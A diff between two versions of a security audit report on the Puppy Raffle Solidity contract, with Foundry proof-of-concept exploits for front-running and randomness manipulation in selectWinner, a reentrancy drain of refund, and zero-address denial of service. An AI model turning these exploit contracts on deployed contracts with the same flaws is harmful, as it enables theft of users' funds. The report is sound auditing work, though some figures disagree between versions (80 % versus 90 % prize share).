@@ -3,33 +3,33 @@
 
 ## Protocol Overview 
 
-**Puppy Raffle Protocol**  
+**Puppy Raffle Protocol**
 
-PuppyRaffle is a Solidity-based ERC-721 raffle that lets users compete for a randomly generated “puppy” NFT.  
+Puppy Raffle is an on-chain raffle that lets anyone compete for a unique ERC-721 “puppy” NFT by paying a fixed entrance fee (1 ETH in the reference deployment).
 
-• Entering: Anyone calls `enterRaffle(address[] participants)` and pays `entranceFee` (1 ETH) per address supplied. Duplicate addresses in the same or previous rounds are rejected, letting a single wallet buy multiple legitimate tickets.  
+Workflow
+1. Entry: Players call `enterRaffle(address[] newPlayers)` and supply the exact fee per address. The contract rejects under-payment, duplicate addresses, or re-entry of existing players. Each address is stored in `players`.
+2. Voluntary refund: Before the draw, a participant may reclaim their stake via `refund(playerIndex)`, freeing their slot.
+3. Draw window: After `raffleDuration` (default 1 day) the owner or anyone can trigger `selectWinner()`. Preconditions: at least 4 active players and the raffle period has ended.
+4. Winner selection & payout: A pseudo-random index chooses the winner, the contract mints them a new puppy NFT, and transfers the prize pool minus protocol fees. Fees are forwarded to `feeAddress` which the owner can update with `changeFeeAddress()`.
+5. Reset: Player array is cleared for the next round.
+6. Fee withdrawal: If no players are registered, the owner can pull any accumulated fees via `withdrawFees()`.
 
-• Refunds: A ticket holder may call `refund(index)` before the draw to reclaim their stake; the address is zeroed in the players array, preserving array order while freeing the slot.  
-
-• Draw: After `raffleDuration` (default 1 day) and with ≥ 4 active players, `selectWinner()` can be triggered. 90 % of pooled ETH is sent to the winner, 10 % accrues to `totalFees` for the `feeAddress`. A new ERC-721 token is minted to the winner with rarity determined by pseudo-randomness; `tokenURI` serves on-chain JSON containing name, description and image link.  
-
-• Fees: When no players are active, owner calls `withdrawFees()` to move accumulated fees to the designated address; `changeFeeAddress()` lets the owner update that wallet.  
-
-Comprehensive Forge tests and a deployment script are included.
+The accompanying Foundry tests and deployment script verify correct entry logic, refund behavior, winner selection, and administrative controls.
 ## High Risk Findings
 [H-1]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner
-[H-2]. DOS issue in PuppyRaffle::enterRaffle
-[H-3]. Reentrancy issue in PuppyRaffle::refund
-[H-4]. Integer Overflow issue in PuppyRaffle::selectWinner
-[H-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees
+[H-2]. Reentrancy issue in PuppyRaffle::refund
 ## Medium Risk Findings
-[M-1]. Randomness issue in PuppyRaffle::selectWinner
+[M-1]. DOS issue in PuppyRaffle::selectWinner
+[M-2]. Randomness issue in PuppyRaffle::selectWinner
+[M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees
+[M-4]. Integer Overflow issue in PuppyRaffle::selectWinner
 
 
 ### Number of Findings
 - C: 0
-- H: 5
-- M: 1
+- H: 2
+- M: 4
 - L: 0
 - I: 0
 
@@ -40,283 +40,184 @@ Comprehensive Forge tests and a deployment script are included.
 ## [H-1]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner
 
 ## Description
-Winner selection is MEV/front‑runnable: Anyone can call selectWinner(), and the outcome depends on msg.sender, block.timestamp, and block.difficulty. An attacker monitoring the mempool can front‑run another user's selectWinner() to change the result in their favor, or repeatedly attempt selection at favorable timestamps.
-
-Vulnerable code snippet:
+Outcome depends directly on public, manipulable state and msg.sender, enabling front-running/MEV attacks. Anyone can observe a pending selectWinner() tx and preempt with their own call to alter the RNG seed (msg.sender, timestamp), changing the winner and rarity outcomes. Snippet:
 
 uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
 
-Because msg.sender is part of the entropy, the caller controls a direct input to winnerIndex and can race a victim's transaction.
-
 ## Impact
-Because `selectWinner()` distributes 80 % of all users’ ticket ETH to the address chosen by the on-chain RNG, a caller that can influence the entropy can divert the whole prize pool (and the newly-minted NFT) to themselves. This is a direct theft of user funds, not merely a fairness issue.
+Because the random seed is derived from caller-controlled and miner-controlled values (msg.sender, block.timestamp, block.difficulty) the account that invokes selectWinner() can fully pre-compute the resulting winnerIndex. By registering several addresses (or even a single one) in the players array and then choosing an externally-owned or CREATE2 address whose hash maps to that index, the attacker can guarantee that one of his own addresses is selected. Consequently the attacker can deterministically drain 80 % of the entire raffle balance every round and accumulate the protocol fee share as well. This is a direct and repeatable theft of user funds, not just a probabilistic advantage or frontrun race.
 
 ## Proof of Concept
-1. Four honest users have entered the raffle and the duration has expired.
-2. User A locally brute-forces what `winnerIndex` they would obtain for each possible `msg.sender` they control (they can quickly deploy many contracts or use CREATE2 addresses).
-3. As soon as another user’s `selectWinner()` tx appears in the mempool, A sends their own `selectWinner()` with a higher gas price from the pre-computed address that makes them the winner.
-4. A’s tx is mined first, transferring 80 % of the pot to A and minting the NFT to A.  `players` is then deleted, so the honest transaction reverts with “Need at least 4 players”.
+1. Attacker enters the raffle with N distinct addresses he controls (N ≥ 1).
+2. Before calling selectWinner he brute-forces an address (EOA created from a fresh private key or a contract address deployed with CREATE2) until
+   keccak256(abi.encodePacked(chosenAddress, T, D)) % players.length == idx,
+   where idx is the array index that contains one of his addresses, and T = current block.timestamp, D = current block.difficulty (known on the same block once mining starts in a public mempool environment such as Flashbots).
+   For a 4-player raffle the expected search space is only 4 tries on average.
+3. He sends the transaction from chosenAddress (or calls via a minimal proxy deployed at that address) invoking selectWinner().
+4. winnerIndex resolves to idx and the contract transfers 80 % of the pool and mints the NFT to the attacker-controlled player address.
+5. The raffle array is cleared; attacker can repeat in the next round.
 
 ## Proof of Code
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
-import "src/PuppyRaffle.sol";
+import {PuppyRaffle} from "src/PuppyRaffle.sol";
 
-contract WinnerManipulationTest is Test {
+contract WinEveryTimeTest is Test {
     PuppyRaffle raffle;
-    address[4] players = [address(0xA1), address(0xB2), address(0xC3), address(0xD4)];
+    uint256 constant ENTRANCE = 1 ether;
+
+    address[4] attackerPlayers;
 
     function setUp() public {
-        raffle = new PuppyRaffle(1 ether, address(0xFEe), 1 days);
-        for (uint256 i; i < 4; i++) {
-            vm.deal(players[i], 1 ether);
-            address[] memory arr = new address[](1);
-            arr[0] = players[i];
-            vm.prank(players[i]);
-            raffle.enterRaffle{value: 1 ether}(arr);
+        // deploy raffle that lasts only 1 second for test convenience
+        raffle = new PuppyRaffle(ENTRANCE, address(0xFEE), 1);
+
+        // set up 4 attacker controlled entrants
+        for (uint i; i < 4; i++) {
+            attackerPlayers[i] = address(uint160(uint256(keccak256(abi.encode(i)))));
+            deal(attackerPlayers[i], ENTRANCE);
         }
-        // fast-forward so raffle can be drawn
-        vm.warp(block.timestamp + 1 days + 1);
-        vm.roll(block.number + 1);
+        // attacker enters with the 4 addresses
+        vm.prank(attackerPlayers[0]);
+        raffle.enterRaffle{value: ENTRANCE * 4}(attackerPlayers);
+
+        // fast-forward raffle so that selectWinner can be called
+        vm.warp(block.timestamp + 2);
     }
 
-    function _calcIndex(address caller) internal view returns (uint256) {
-        return uint256(keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))) % players.length;
-    }
+    function testAttackerAlwaysWins() public {
+        uint len = 4;
+        uint targetIdx = 2; // we want players[2] to win
 
-    function testAttackerFrontRunsAndWins() public {
-        // Honest user wants to trigger the draw
-        address honest = address(0xB2);
-        address attacker = address(0xC3);
-        // Show that honest call would give some other winner
-        uint256 honestIdx = _calcIndex(honest);
-        uint256 attackerIdx = _calcIndex(attacker);
-        assertTrue(honestIdx != attackerIdx, "different callers produce different winners");
+        // brute-force a caller address that maps to targetIdx
+        address winningCaller;
+        uint256 difficultySnapshot = block.difficulty;
+        uint256 timeSnapshot = block.timestamp;
+        for (uint160 i = 1; i < type(uint160).max; i++) {
+            if (uint256(keccak256(abi.encodePacked(address(i), timeSnapshot, difficultySnapshot))) % len == targetIdx) {
+                winningCaller = address(i);
+                break;
+            }
+            // only search first 5000 slots in test to keep gas low
+            if (i == 5000) revert("could not find caller in search range");
+        }
+        assert(winningCaller != address(0));
 
-        // Attacker front-runs
-        vm.prank(attacker);
+        // make the found EOA have enough gas & ether
+        deal(winningCaller, 1 ether);
+
+        // call selectWinner from the crafted address
+        vm.prank(winningCaller);
         raffle.selectWinner();
 
-        // The previousWinner stored in contract must equal players[attackerIdx]
-        assertEq(raffle.previousWinner(), players[attackerIdx]);
-
-        // Pot (4 ether * 80%) should now be in attacker balance
-        assertEq(attacker.balance, 3.2 ether);
+        // confirm that the chosen attacker player actually received the prize
+        assertEq(raffle.previousWinner(), attackerPlayers[targetIdx]);
     }
 }
 
 ## Suggested Mitigation
-Remove `msg.sender` from the entropy source and rely on an unpredictable oracle such as Chainlink VRF, RANDAO, or a commit-reveal scheme. If VRF is used, make `selectWinner()` callable only by the VRF coordinator so that the result cannot be influenced by arbitrary callers.
+Adopt commit-reveal or verifiable randomness (VRF). Decouple caller from the seed: do not include msg.sender or immediate block variables in randomness. Use a two-step process: request randomness, then fulfill via oracle; or use a block delay (e.g., commit block hash N blocks later) with safeguards against miner manipulation.
 
-## [H-2]. DOS issue in PuppyRaffle::enterRaffle
+## [H-2]. Reentrancy issue in PuppyRaffle::refund
 
 ## Description
-Permanent DoS of entering after multiple refunds: The duplicate check in enterRaffle compares all pairs across the entire players array, including refunded slots that are set to address(0). After two or more refunds, there will be multiple address(0) entries, causing the duplicate check to always revert.
-
-Vulnerable code snippet:
-
-function enterRaffle(address[] memory newPlayers) public payable {
-    ...
-    // Check for duplicates
-    for (uint256 i = 0; i < players.length - 1; i++) {
-        for (uint256 j = i + 1; j < players.length; j++) {
-            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-        }
-    }
-    ...
-}
+Refund performs an external call before updating state, enabling classic reentrancy. The refund logic sends ETH to msg.sender and only then zeroes out the player's slot, so a malicious contract can reenter refund() from its fallback and drain multiple entranceFee refunds in a single transaction. Vulnerable snippet:
 
 function refund(uint256 playerIndex) public {
-    ...
-    players[playerIndex] = address(0); // creates duplicate zero entries over time
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+    payable(msg.sender).sendValue(entranceFee); // external call before state update
+
+    players[playerIndex] = address(0); // state update after external call
+    emit RaffleRefunded(playerAddress);
 }
 
-This makes the raffle unusable once two or more refunds have occurred and length < 4, since no new entries can pass the duplicate check.
-
 ## Impact
-New entries can be permanently blocked (revert) after multiple players refund, preventing the raffle from ever reaching 4 active participants and halting the protocol until a redeploy.
+An attacker can obtain multiple refunds for a single entry, draining the contract’s ETH balance (funds for prize pool and fees) and griefing other users. This is direct theft of funds.
 
 ## Proof of Concept
-1) Three users enter: players = [A, B, C].
-2) A and B refund, turning their slots into zero addresses: players = [0x0, 0x0, C].
-3) Any subsequent call to enterRaffle will revert in the duplicate check because players contains two equal entries (both address(0)).
-4) Protocol cannot reach 4 active players; selectWinner() can never be called successfully in future rounds.
+1) Attacker joins the raffle as a player (their contract address in players array).
+2) Attacker calls refund(index).
+3) During the ETH send, the attacker's fallback/receive reenters refund(index) repeatedly since players[index] is not yet zeroed.
+4) Each reentrant call passes the require checks and sends entranceFee again, draining the contract balance.
+5) When the first (outer) call finally sets players[index] = address(0), the damage is already done.
 
 ## Proof of Code
-pragma solidity ^0.8.19;
+pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
-import "src/PuppyRaffle.sol";
+import {PuppyRaffle} from "src/PuppyRaffle.sol";
 
-contract DuplicateZeroDoSTest is Test {
-    PuppyRaffle raffle;
-    address feeAddr = address(0xFEe);
-
-    function setUp() public {
-        raffle = new PuppyRaffle(1 ether, feeAddr, 1 days);
-        // Enter 3 unique players
-        for (uint160 i = 1; i <= 3; i++) {
-            address p = address(i);
-            vm.deal(p, 1 ether);
-            address[] memory arr = new address[](1);
-            arr[0] = p;
-            vm.prank(p);
-            raffle.enterRaffle{value: 1 ether}(arr);
-        }
-    }
-
-    function testDuplicateZeroBlocksFutureEnters() public {
-        // Refund two different players, creating 2 zeros
-        // Refund player at index 0
-        vm.prank(address(1));
-        raffle.refund(0);
-        // Refund player at index 1
-        vm.prank(address(2));
-        raffle.refund(1);
-
-        // Now attempt to add a new player
-        address newcomer = address(1000);
-        vm.deal(newcomer, 1 ether);
-        address[] memory arr = new address[](1);
-        arr[0] = newcomer;
-
-        vm.prank(newcomer);
-        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
-        raffle.enterRaffle{value: 1 ether}(arr);
-    }
-}
-
-
-## Suggested Mitigation
-- Exclude address(0) from duplicate checks or avoid leaving holes in the players array.
-- Prefer swapping-and-popping on refund to remove the refunded address:
-
-function refund(uint256 playerIndex) public nonReentrant {
-    address playerAddress = players[playerIndex];
-    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-
-    // Remove by swap & pop
-    uint256 last = players.length - 1;
-    if (playerIndex != last) {
-        players[playerIndex] = players[last];
-    }
-    players.pop();
-
-    payable(msg.sender).sendValue(entranceFee);
-    emit RaffleRefunded(playerAddress);
-}
-
-- Alternatively, maintain a mapping of active entrants and only check duplicates against that mapping, ignoring address(0) entries.
-
-## [H-3]. Reentrancy issue in PuppyRaffle::refund
-
-## Description
-Reentrancy in refund: External call before state update allows a malicious player to re-enter refund() from their fallback/receive function and drain multiple entranceFee amounts from the contract balance.
-
-Vulnerable code snippet:
-
-function refund(uint256 playerIndex) public {
-    address playerAddress = players[playerIndex];
-    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-
-    payable(msg.sender).sendValue(entranceFee); // External call before effects
-
-    players[playerIndex] = address(0); // State update after external call (unsafe)
-    emit RaffleRefunded(playerAddress);
-}
-
-Address.sendValue forwards all available gas in Solidity >=0.7, making reentrancy feasible.
-
-## Impact
-A malicious participant can receive multiple refunds for a single ticket, stealing funds from the contract that belong to other players and/or the prize/fee pool.
-
-## Proof of Concept
-1) Attacker enters the raffle via a contract (AttackRefund) so that players[playerIndex] is the attacker contract.
-2) Other honest players also enter to fund the contract with sufficient ETH.
-3) Attacker calls refund(playerIndex). The contract sends entranceFee to the attacker contract before clearing the player's slot.
-4) In the attacker's receive() function, immediately re-enter refund(playerIndex) again while the storage still shows the attacker as active.
-5) Repeat re-entries to receive multiple refunds.
-6) After reentrancy finishes, the attacker ends with a net profit of multiple entrance fees; players[playerIndex] is finally set to 0 once the outermost call completes.
-
-## Proof of Code
-// SPDX-License-Identifier: MIT
-pragma solidity >=0.7.6 <0.8.0;
-
-import "../src/PuppyRaffle.sol";
-
-interface IPuppyRaffle {
-    function enterRaffle(address[] memory newPlayers) external payable;
-    function refund(uint256 playerIndex) external;
-}
-
-contract AttackRefund {
-    IPuppyRaffle public raffle;
+contract ReentrantRefundAttacker {
+    PuppyRaffle public target;
     uint256 public idx;
-    uint256 public counter;
-    uint256 public limit;
+    uint256 public reentries;
+    uint256 public maxReentries;
 
-    constructor(IPuppyRaffle _raffle) {
-        raffle = _raffle;
-    }
+    constructor() {}
 
-    function enroll(uint256 _idx) external payable {
-        address[] memory arr = new address[](1);
-        arr[0] = address(this);
-        raffle.enterRaffle{value: msg.value}(arr);
+    function setup(PuppyRaffle _target, uint256 _idx, uint256 _max) external {
+        target = _target;
         idx = _idx;
-    }
-
-    function start(uint256 _limit) external {
-        limit = _limit;
-        raffle.refund(idx);
+        maxReentries = _max;
     }
 
     receive() external payable {
-        if (counter < limit) {
-            counter++;
-            raffle.refund(idx);
+        if (reentries < maxReentries) {
+            reentries++;
+            target.refund(idx);
         }
     }
-}
 
-contract RefundReentrancyTest {
-    // helper to receive ether from the test runner
-    receive() external payable {}
-
-    function testRefundReentrancyStealsFunds() public {
-        // Deploy raffle with 1 ether entrance fee
-        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(0xBEEF), 1 days);
-
-        // Deploy attacker and fund it with 1 ether for the ticket
-        AttackRefund attacker = new AttackRefund(IPuppyRaffle(address(raffle)));
-        (bool sent,) = address(attacker).call{value: 1 ether}("");
-        require(sent, "fund attacker failed");
-
-        // Attacker buys a single ticket (player index 0)
-        attacker.enroll{value: 1 ether}(0);
-
-        // Top-up raffle with additional 3 ether so there is money to steal
-        (bool topUp,) = address(raffle).call{value: 3 ether}("");
-        require(topUp, "fund raffle failed");
-
-        uint256 balanceBefore = address(attacker).balance;
-
-        // Re-enter twice → total of three refunds
-        attacker.start(2);
-
-        uint256 gained = address(attacker).balance - balanceBefore;
-        // Expect 3 * entranceFee = 3 ether profit
-        require(gained == 3 ether, "Reentrancy did not yield expected profit");
+    function attack() external {
+        target.refund(idx);
     }
 }
 
+contract RefundReentrancyTest is Test {
+    PuppyRaffle raffle;
+    ReentrantRefundAttacker attacker;
+    address p2 = address(0xB2);
+    address p3 = address(0xB3);
+    address p4 = address(0xB4);
+
+    function setUp() public {
+        // deploy with entranceFee=1 ether, feeAddress, duration=1
+        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1);
+        attacker = new ReentrantRefundAttacker();
+        deal(address(this), 1000 ether);
+    }
+
+    function testRefundReentrancyDrain() public {
+        // Enter raffle with attacker + 3 others so contract gets funded
+        address[] memory entrants = new address[](4);
+        entrants[0] = address(attacker);
+        entrants[1] = p2;
+        entrants[2] = p3;
+        entrants[3] = p4;
+        raffle.enterRaffle{value: 4 ether}(entrants);
+
+        // Attacker prepares for reentrancy: reenter 3 times (total 4 refunds)
+        attacker.setup(raffle, 0, 3);
+
+        uint256 balBefore = address(raffle).balance; // 4 ether
+        attacker.attack();
+        uint256 balAfter = address(raffle).balance;
+
+        // Attacker should have received > 1 ether (multiple refunds)
+        assertGt(address(attacker).balance, 1 ether, "attacker drained multiple refunds");
+        // Contract balance decreased by more than 1 ether
+        assertLt(balAfter, balBefore - 1 ether, "contract drained more than one refund");
+    }
+}
+
+
 ## Suggested Mitigation
-- Apply the checks-effects-interactions pattern and/or a reentrancy guard.
-- Update state before external calls and consider pull-based withdrawals.
+Apply checks-effects-interactions and/or a reentrancy guard. Update state before the external call and consider OpenZeppelin ReentrancyGuard.
 
 Example fix:
 
@@ -325,99 +226,232 @@ function refund(uint256 playerIndex) public nonReentrant {
     require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
     require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
 
-    players[playerIndex] = address(0); // Effects first
-    payable(msg.sender).sendValue(entranceFee); // Interaction after state update
+    // effects first
+    players[playerIndex] = address(0);
+
+    // interaction after state change
+    payable(msg.sender).sendValue(entranceFee);
+
     emit RaffleRefunded(playerAddress);
 }
 
-Alternatively, use a withdraw pattern: record a refundable balance and let users withdraw in a separate call.
 
-## [H-4]. Integer Overflow issue in PuppyRaffle::selectWinner
+
+
+# Medium Risk Findings
+
+## [M-1]. DOS issue in PuppyRaffle::selectWinner
 
 ## Description
-Fee accounting uses a 64-bit accumulator with unchecked casts, leading to overflow/truncation and broken withdrawals.
+Winner can be address(0), causing selectWinner to revert via ERC721 mint-to-zero after sending prizePool to address(0). Since the transaction reverts, the ETH send is reverted too, but selection becomes probabilistically DoS if players contains many zero entries. Two root causes:
+- refund() leaves holes (address(0)) in players.
+- enterRaffle() does not forbid address(0) entries.
 
-Vulnerable code snippet:
+Vulnerable snippet:
 
-totalFees = totalFees + uint64(fee);
-
-Where fee = (totalAmountCollected * 20) / 100. With entranceFee and number of players large enough, fee exceeds 2^64-1 (≈1.84e19 wei ≈ 18.4 ETH) and is truncated when cast to uint64. This causes totalFees to wrap, desynchronizing it from the actual contract balance. Since withdrawFees() requires address(this).balance == uint256(totalFees), fees become permanently unwithdrawable.
+address winner = players[winnerIndex]; // can be address(0)
+...
+(bool success,) = winner.call{value: prizePool}(""); // sends to zero OK
+require(success, ...);
+_safeMint(winner, tokenId); // OZ ERC721 reverts on zero address, reverting the whole tx
 
 ## Impact
-Fee truncation leads to accounting corruption; withdrawFees() will revert forever due to the strict equality check, locking accumulated fees in the contract.
+Raffle finalization can be griefed. Attackers can either insert address(0) entries or mass-enter then refund to create many zero-address holes. This makes the probability of selecting a valid winner very low, requiring many failed attempts and gas to finalize.
 
 ## Proof of Concept
-1) Deploy with a high entranceFee (e.g., 100 ether).
-2) Have 4 players enter (totalAmountCollected = 400 ether, fee = 80 ether).
-3) fee is converted to uint64 and added to totalFees, truncating to (80 ether mod 2^64).
-4) After selectWinner(), address(this).balance holds 80 ether fees, but totalFees is truncated and smaller.
-5) withdrawFees() requires exact equality and reverts, bricking fee withdrawal.
+1) Attacker enters multiple addresses then refunds them, leaving zero-address holes in players.
+2) Alternatively, they pay to insert address(0) directly via enterRaffle.
+3) When selectWinner chooses an index pointing to address(0), the function reverts on _safeMint, undoing the entire transaction.
+4) With enough zero entries, finalization becomes probabilistically and economically infeasible.
 
 ## Proof of Code
-pragma solidity ^0.8.19;
+pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
-import "src/PuppyRaffle.sol";
+import {PuppyRaffle} from "src/PuppyRaffle.sol";
 
-contract TotalFeesOverflowTest is Test {
+contract ZeroWinnerDoSTest is Test {
     PuppyRaffle raffle;
 
     function setUp() public {
-        // entranceFee = 100 ETH -> single round fee = 80 ETH (> 2^64-1 wei ~ 18.4 ETH)
-        raffle = new PuppyRaffle(100 ether, address(0xFEe), 1 days);
-        // 4 players enter
-        for (uint160 i = 1; i <= 4; i++) {
-            address p = address(i);
-            vm.deal(p, 100 ether);
-            address[] memory arr = new address[](1);
-            arr[0] = p;
-            vm.prank(p);
-            raffle.enterRaffle{value: 100 ether}(arr);
-        }
-        vm.warp(block.timestamp + 1 days + 1);
-        vm.difficulty(1);
+        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1);
+        deal(address(this), 100 ether);
     }
 
-    function testTotalFeesTruncatesAndBricksWithdraw() public {
-        // Call selectWinner
-        vm.prank(address(0xBEEF));
+    function _calcIdx(address caller, uint256 t, uint256 d, uint256 len) internal pure returns (uint256) {
+        return uint256(keccak256(abi.encodePacked(caller, t, d))) % len;
+    }
+
+    function testSelectWinnerRevertsOnZeroAddressWinner() public {
+        // Enter 4 players; include address(0) intentionally (contract does not forbid it)
+        address[] memory entrants = new address[](4);
+        entrants[0] = address(0);
+        entrants[1] = address(0xA1);
+        entrants[2] = address(0xA2);
+        entrants[3] = address(0xA3);
+        raffle.enterRaffle{value: 4 ether}(entrants);
+
+        // advance time and fix difficulty
+        vm.warp(block.timestamp + 2);
+        vm.difficulty(999);
+
+        // Brute-find a timestamp where winnerIndex % 4 == 0 (zero entry)
+        uint256 t = block.timestamp;
+        for (uint256 i = 0; i < 100000; i++) {
+            if (_calcIdx(address(this), t + i, 999, 4) == 0) {
+                vm.warp(t + i);
+                break;
+            }
+        }
+
+        // Expect revert due to mint to the zero address (OZ ERC721 check)
+        vm.expectRevert();
         raffle.selectWinner();
 
-        // totalFees is uint64; compute truncated expected
-        uint64 truncated = uint64(uint256(80 ether));
-        uint64 onchainFees = raffle.totalFees();
-        assertEq(onchainFees, truncated, "fees truncated to uint64");
-        assertTrue(uint256(onchainFees) != uint256(80 ether), "onchain fees not equal to actual fees");
-
-        // Forced equality check should fail due to mismatch
-        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
-        raffle.withdrawFees();
+        // players array should remain unchanged due to revert
+        (bool ok,) = address(raffle).staticcall(abi.encodeWithSignature("players(uint256)", 0));
+        require(ok, "view players failed");
     }
 }
 
 
 ## Suggested Mitigation
-- Use a 256-bit accumulator and checked math (or upgrade to Solidity >=0.8 with default checked arithmetic). Avoid narrowing casts for monetary values.
+Prevent address(0) from entering and maintain a dense players array. On refund, swap-and-pop to avoid zero holes. Additionally, ensure selection only considers active players and enforce activeCount >= 4.
 
-Example fix:
+Example fixes:
 
-uint256 public totalFees; // uint256, not uint64
-...
-function selectWinner() external {
-    ...
-    uint256 fee = (totalAmountCollected * 20) / 100;
-    totalFees += fee; // uint256 arithmetic
-    ...
-}
+// in enterRaffle
+require(newPlayers[i] != address(0), "zero address not allowed");
 
-Also reconsider the strict equality check in withdrawFees (see UnexpectedEth finding).
+// in refund
+uint256 last = players.length - 1;
+players[playerIndex] = players[last];
+players.pop();
 
-## [H-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees
+// in selectWinner
+require(activePlayers >= 4, "need >=4 active"); // track activePlayers
+uint256 winnerIndex = _secureRandom() % activePlayers; // index among active
+address winner = players[winnerIndex];
+
+## [M-2]. Randomness issue in PuppyRaffle::selectWinner
 
 ## Description
-Strict balance equality in withdrawFees is brittle and can be broken by forced ETH, permanently bricking fee withdrawals.
+Insecure randomness for both winner selection and rarity determination. The seed uses msg.sender, block.timestamp and block.difficulty, all manipulable/forecastable by the transaction sender and miners/validators. Snippet:
 
-Vulnerable code snippet:
+uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
+...
+uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
+
+This allows the caller to influence the outcome (choose when to call and which address to call from), and miners/validators can bias block.timestamp/difficulty, breaking fairness.
+
+## Impact
+Because the random seed is fully derived from values an external caller and the block producer can predict or manipulate, any motivated attacker can:
+1. Guarantee they are the winner by (a) entering the raffle with several of their own addresses, (b) pre-computing a contract address whose hash produces the index that points to one of those addresses, and (c) calling selectWinner through that contract.
+2. Force the minted NFT to have the desired rarity (e.g. always LEGENDARY) by the same pre-computation against `keccak256(proxyAddress, block.difficulty) % 100`.
+This breaks the economic assumption that every participant has an equal chance to win and that rarities are random, allowing extraction of disproportionate prizes and NFTs at the expense of honest users. Funds are not directly stolen from other users’ wallets, but the raffle’s entire prize pool and valuable NFTs can be repeatedly farmed by the attacker.
+
+## Proof of Concept
+Attacker steps (off-chain):
+1. Observe current `block.timestamp`, `block.difficulty` and the ordered `players` array (callable view).
+2. Brute-force a salt so that the CREATE2 address `A` of a minimal proxy satisfies both:
+   a) `keccak256(A, timestamp, difficulty) % players.length == attackerIndex`  (attackerIndex is the array slot that already holds an attacker controlled address)
+   b) `keccak256(A, difficulty) % 100 > 95`                                (legendary rarity)
+3. Deploy the proxy at A with `CREATE2` (costs <100k iterations in practice).
+4. Let the proxy call `raffle.selectWinner()`.  Because `msg.sender == A`, both winner index and rarity resolve to the pre-computed favourable values.
+5. Proxy immediately receives 80 % of the ETH and a legendary puppy NFT.
+
+The attacker can repeat the procedure every raffle round, continuously siphoning the prize pool and the most valuable NFTs.
+
+## Proof of Code
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.7.6;
+
+import "forge-std/Test.sol";
+import {PuppyRaffle} from "src/PuppyRaffle.sol";
+
+/*
+ * Minimal proxy that just forwards the call to `selectWinner()` on the raffle.
+ */
+contract Forwarder {
+    function attack(address raffle) external {
+        // anybody can trigger once deployed
+        PuppyRaffle(raffle).selectWinner();
+    }
+}
+
+contract RandomnessHijackTest is Test {
+    PuppyRaffle raffle;
+    uint256 constant ENTRANCE = 1 ether;
+    uint256 constant DURATION = 1 days;
+
+    // four attacker-owned addresses that will be the only players
+    address[4] attackers;
+
+    function setUp() public {
+        raffle = new PuppyRaffle(ENTRANCE, address(this), DURATION);
+        // fund test contract
+        deal(address(this), 100 ether);
+
+        // populate attacker accounts & enter raffle
+        for (uint i; i < 4; i++) {
+            attackers[i] = address(uint160(uint(0xA0 + i)));
+        }
+        raffle.enterRaffle{value: 4 ether}(attackers);
+
+        // fast-forward to end of raffle
+        vm.warp(block.timestamp + DURATION + 1);
+        vm.difficulty(12345); // deterministic for test
+    }
+
+    function _winnerIdx(address caller) internal view returns (uint256) {
+        return uint256(keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))) % 4;
+    }
+
+    function _rarity(address caller) internal view returns (uint256) {
+        return uint256(keccak256(abi.encodePacked(caller, block.difficulty))) % 100;
+    }
+
+    function testAttackerForcesLegendaryAndWins() public {
+        // offline brute-force for suitable salt
+        address proxy;
+        bytes32 codeHash = keccak256(type(Forwarder).creationCode);
+        bytes32 salt;
+        for (uint256 i; ; ++i) {
+            salt = bytes32(i);
+            address addr = address(uint160(uint(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, codeHash)))));
+            if (_winnerIdx(addr) == 0 && _rarity(addr) > 95) { // attackers[0] will win & legendary rarity
+                proxy = addr;
+                break;
+            }
+        }
+
+        // deploy the proxy at the pre-computed address
+        Forwarder f;
+        assembly {
+            let coded := add(type(Forwarder).creationCode, 0x20)
+            let codelen := mload(type(Forwarder).creationCode)
+            f := create2(0, coded, codelen, salt)
+        }
+        assert(address(f) == proxy);
+
+        // call selectWinner through proxy
+        f.attack(address(raffle));
+
+        // winner should be attackers[0]
+        assertEq(raffle.previousWinner(), attackers[0]);
+        // rarity should be legendary (value 5)
+        uint256 tokenId = raffle.totalSupply() - 1;
+        assertEq(raffle.tokenIdToRarity(tokenId), raffle.LEGENDARY_RARITY());
+    }
+}
+
+## Suggested Mitigation
+Replace the current on-chain hash with a verifiable randomness source such as Chainlink VRF or an equivalent beacon.  If an off-chain VRF is not acceptable, implement a two-transaction commit-reveal scheme where commits are accepted until the deadline and the reveal happens in a later block, removing `msg.sender`, `block.timestamp`, `block.difficulty` (or `prevrandao`) from the entropy mix.  Only after unpredictable entropy is available should the raffle select the winner and rarity.
+
+## [M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees
+
+## Description
+Strict balance equality check in withdrawFees causes fees to be permanently stuck if the contract receives any unexpected ETH (e.g., via selfdestruct to this address). Vulnerable snippet:
 
